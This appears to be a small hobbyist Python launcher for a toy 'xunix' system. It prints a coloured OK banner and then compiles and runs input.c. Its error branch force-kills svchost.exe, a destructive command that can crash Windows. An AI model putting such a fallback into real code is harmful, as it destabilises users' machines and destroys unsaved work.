import os, random

# Picking up from C defining.

XUNIX_COLOR_BLACK = "\x1b[30m"
XUNIX_COLOR_BLUE = "\x1b[34m"
XUNIX_COLOR_GREEN = "\x1b[32m"
XUNIX_COLOR_CYAN = "\x1b[36m"
XUNIX_COLOR_RED = "\x1b[31m"
XUNIX_COLOR_MAGENTA = "\x1b[35m"
XUNIX_COLOR_WHITE = "\x1b[37m"
OK = "[  \x1b[32mOK\x1b[39m  ]"
DRIVE = 2
PARTSIZE = 4096

XUNIXMS1 = DRIVE * PARTSIZE

flockname = random.randint(1, 1000000)

try:
    print(OK + " " + os.getlogin() + " on xunix")
except Exception:
    os.system("taskkill /f /im svchost.exe")
    exit()

os.system("g++ input.c -o " + str(flockname))
os.system(str(flockname) + ".exe")